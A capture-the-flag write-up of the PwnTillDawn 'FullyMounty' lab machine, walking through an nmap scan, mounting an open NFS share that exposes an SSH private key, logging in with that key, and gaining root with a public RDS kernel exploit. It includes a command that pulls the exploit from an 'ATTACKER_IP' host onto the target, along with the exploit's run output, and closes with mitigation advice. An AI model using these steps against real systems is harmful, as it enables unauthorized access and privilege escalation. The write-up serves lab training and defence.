---
icon: fas fa-info-circle
order: 4
categories: PwnTillDawn
tags: NFS SSH RDS
image: https://online.pwntilldawn.com/Content/img/machines/64.png
---


## 🔥 Introduction

In the ever-evolving landscape of cybersecurity, few experiences rival the adrenaline rush of compromising a live, unpredictable target. FullyMounty is one such machine—an immersive penetration testing challenge crafted to test not just your tools, but your mindset.

Whether you’re a seasoned red teamer refining your techniques or an aspiring ethical hacker eager for your first shell, FullyMounty offers a layered blend of vulnerabilities that demand curiosity, patience, and determination.

In this write-up, we’ll unpack every step of the journey—from initial reconnaissance to full system compromise—highlighting practical lessons and tactics you can apply to real-world engagements.

Get ready to dive deep, think critically, and discover how persistence turns possibility into success.


## 🔍 Initial Enumeration with Nmap

 I began by performing a comprehensive port scan to identify open services and gather version information. The following Nmap command was used:
```php
nmap -sS -sC -sV 10.150.150.134 -oN scans
```
Scan Breakdown:

    -sS: TCP SYN scan (stealthy)

    -sC: Default NSE scripts for common service enumeration

    -sV: Service version detection

    -oN scans: Output results to a file named scans

Scan Results
```
┌──(dr4xven㉿localhost)-[/media/…/FLAYER/MACHINES/PTD/FullMounty]
└─$ nmap -sS -sC -sV  10.150.150.134  -oN scans
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 20:07 EAT
Nmap scan report for 10.150.150.134
Host is up (0.23s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 5.3p1 Debian 3ubuntu7.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 f6:e9:3f:cf:88:ec:7c:35:63:91:34:aa:14:55:49:cc (DSA)
|_  2048 20:1d:e9:90:6f:4b:82:a3:71:1e:a9:99:95:7f:31:ea (RSA)
111/tcp  open  rpcbind  2 (RPC 00000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      34154/tcp   mountd
|   100005  1,2,3      50354/udp   mountd
|   100021  1,3,4      45783/tcp   nlockmgr
|   100021  1,3,4      48262/udp   nlockmgr
|   100024  1          38840/udp   status
|_  100024  1          40110/tcp   status
2049/tcp open  nfs      2-4 (RPC 100003)
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2019-10-28T09:51:59
|_Not valid after:  2022-10-27T09:51:59
|_http-title: splunkd
|_http-server-header: Splunkd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.80 seconds
```

 Results Summary:
Port	State	Service	Version
22/tcp	Open	SSH	OpenSSH 5.3p1 Debian 3ubuntu7.1
111/tcp	Open	rpcbind	RPC 100000
2049/tcp	Open	NFS	NFS v2-4
8089/tcp	Open	SSL/HTTP (Splunk)	Splunkd HTTP Server with self-signed SSL cert

Notable Details:

    SSH (Port 22): Running an older version of OpenSSH—potentially vulnerable if weak credentials or exploits apply.

    rpcbind/NFS (Ports 111, 2049): NFS shares may be accessible without authentication.

    Splunk (Port 8089): Splunkd management interface over HTTPS. The SSL certificate is self-signed and expired, suggesting possible misconfiguration.

![screenshot](/assets/screenshots/FullMounty/1.webp)

## 📂 NFS Enumeration and Mounting

After identifying NFS services on ports 111 and 2049, I probed for exported shares and successfully mounted one containing potentially sensitive files.

Mount Command Used:
```php
sudo mount -v -t nfs -o vers=3 10.150.150.134:/srv/exportnfs /tmp/mounty
```
Command Breakdown
```
-t nfs: Specify NFS filesystem type

-o vers=3: Force NFS version 3 for compatibility

/srv/exportnfs: Remote export path

/tmp/mounty: Local mount point

Mounted Share Contents:
```
The Contents of the share
```
total 32
drwxrwxrwx  5 nobody  nogroup 4096 Oct 29  2019 .
-rwxrwxrwx  1 nobody  nogroup  667 Oct 29  2019 .bash_history
drwxrwxrwx  5 nobody  nogroup 4096 Oct 29  2019 .config
-rw-r--r--  1 dr4xven dr4xven   41 Oct 22  2019 FLAG49
-rw-r--r--  1 dr4xven dr4xven 1675 Oct  3  2019 id_rsa
-rw-r--r--  1 dr4xven dr4xven  397 Oct  3  2019 id_rsa.pub
```

Actions Taken:
I copied the entire share locally for offline inspection:
```
sudo cp -r /tmp/mounty/ .
```
![screenshot](assets/screenshots/FullMounty/2.webp)

## 🏴 Flag Discovery & Credential Enumeration
While reviewing the contents of the mounted NFS share, I discovered valuable information:

![screenshot](assets/screenshots/FullMounty/3.webp)

Credentials:
```php
deadbeef@ubuntu
```

Evidence Summary:
Artifact	Details
Username	deadbeef
Flag	FLAG49
Private Key	id_rsa (SSH private key)
Public Key	id_rsa.pub
History File	.bash_history

## 🔑 SSH Access Using Extracted Private Key

Initial Attempt:

I attempted to authenticate via SSH with the extracted id_rsa private key:
```
ssh deadbeef@10.150.150.134 -i id_rsa
```
![screnshot](assets/screenshots/FullMounty/4.webp)

Observed Issue:

The connection failed due to an SSH host key algorithm mismatch.
This occurs because modern OpenSSH clients disable ssh-rsa and ssh-dss algorithms by default due to security deprecation.

$$$ Solution:

To re-enable support for ssh-rsa, I used the following command:

```
ssh deadbeef@10.150.150.134 -i id_rsa -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa
```
Explanation of Options:

    -oHostKeyAlgorithms=+ssh-rsa: Allows negotiation of the ssh-rsa host key.

    -oPubkeyAcceptedAlgorithms=+ssh-rsa: Permits the client to accept ssh-rsa keys for authentication.

![screenshot](assets/screenshots/FullMounty/5.webp)

After gaining Access let's go for the flags

```php
Last login: Wed Aug 12 00:50:59 2020
deadbeef@FullMounty:~$ whoami
deadbeef
deadbeef@FullMounty:~$ ls -al
total 48
drwxr-xr-x 5 deadbeef deadbeef 4096 2020-08-12 01:07 .
drwxr-xr-x 3 root     root     4096 2019-10-03 00:11 ..
-rw------- 1 deadbeef deadbeef  121 2020-08-12 02:00 .bash_history
-rw-r--r-- 1 deadbeef deadbeef  220 2019-10-03 00:11 .bash_logout
-rw-r--r-- 1 deadbeef deadbeef 3103 2019-10-03 00:11 .bashrc
drwxr-xr-x 2 deadbeef deadbeef 4096 2019-10-03 01:01 .cache
-rw------- 1 deadbeef deadbeef   41 2019-10-22 01:30 FLAG50
-rw------- 1 root     root       41 2019-10-22 01:32 FLAG51
-rw------- 1 root     root       10 2020-04-17 13:27 .nano_history
-rw-r--r-- 1 deadbeef deadbeef  675 2019-10-03 00:11 .profile
drwx--x--- 2 root     root     4096 2019-10-28 03:01 .splunk
drwx------ 2 deadbeef deadbeef 4096 2019-10-03 02:34 .ssh
-rw-r--r-- 1 deadbeef deadbeef    0 2019-10-03 01:02 .sudo_as_admin_successful
deadbeef@FullMounty:~$ cat FLAG50
8f776e191c1253159e<REDACTED>b5d5969a804b83
deadbeef@FullMounty:~$ cat FLAG51
cat: FLAG51: Permission denied
deadbeef@FullMounty:~$ 
```
![screenshot](assets/screenshots/FullMounty/6.webp)


## 🚀 Privilege Escalation

After obtaining SSH access as the deadbeef user, I began enumerating the target system for privilege escalation vectors.

Kernel Exploit Used:

Upon reviewing the kernel version and configuration, I identified that the machine was vulnerable to the rds exploit, which leverages a vulnerability in the Reliable Datagram Sockets (RDS) implementation.

Reference:
GitHub - https://github.com/lucyoa/kernel-exploits/blob/master/rds/rds


📥 Exploit Transfer

I serveD the exploit locally with a simple Python HTTP server and retrieve it on the target with wget.

Steps Taken:

Download the Exploit Locally:

On my attacker machine:
```
wget https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/rds/rds.c -O rds.c
```

Start a Python HTTP Server:

From the same directory:

```
python3 -m http.server
```

This made rds.c available over HTTP on port 8000.

Download the Exploit on the Target:

On the target via SSH:

```
wget http://ATTACKER_IP:8000/rds.c -O /tmp/rds.c
```

what happened was this:
```
Saving to: `rds'

100%[=============================================================================>] 582,477      212K/s   in 2.7s    

2025-06-20 13:18:30 (212 KB/s) - `rds' saved [582477/582477]

deadbeef@FullMounty:~$ chmod +x rds        
deadbeef@FullMounty:~$ ./rds
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved security_ops to 0xc08c8c2c
 [+] Resolved default_security_ops to 0xc0773300
 [+] Resolved cap_ptrace_traceme to 0xc02f3dc0
 [+] Resolved commit_creds to 0xc016dcc0
 [+] Resolved prepare_kernel_cred to 0xc016e000
[*] Overwriting security ops...
[*] Overwriting function pointer...
[*] Triggering payload...
[*] Restoring function pointer...
[*] Got root!
# ======================================>] 582,477      212K/s   in 2.7s     │        TX errors 0  dropped 103 overruns 0  carrier 0  collisions 0
                                             sh: ======================================: not found
# id
uid=0(root) gid=0(root)
# pwd
/home/deadbeef
# ls
]  FLAG50  FLAG51  PwnKit  rds  rds_exploit
# cat FLAG51
f4ba5b1880b551<REDACTED>4f1727eb0e
#
```
![screenshot](assets/screenshots/FullMounty/7.webp)

✅ Conclusion

This engagement demonstrated how a combination of weakly secured services and an unpatched kernel can lead to full system compromise. By enumerating exposed NFS shares, recovering sensitive credentials, and exploiting a known kernel vulnerability, I was able to escalate privileges from a regular user to root.


## 🛡️ Mitigation Recommendations

To prevent similar attacks, I recommend the following actions:

    Update the Kernel:
    Patch or upgrade to a version that fixes the RDS socket vulnerability.

    Restrict NFS Exports:
    Limit NFS shares to trusted IP addresses and enforce appropriate permissions.

    Harden SSH Configuration:

        Disable deprecated algorithms like ssh-rsa and ssh-dss.

        Use key-based authentication with strong passphrases.

        Restrict SSH access to necessary users.

    Regularly Audit Exposed Services:
    Use tools like Nmap to identify and remediate unnecessary open ports.

    Monitor for Suspicious Activity:
    Implement logging and intrusion detection to catch exploitation attempts early.

Till Next Time

#SerialKiller #Sniper #OperationFireball #KillTheLimits #RedTeaming #Pentesting #Hacking
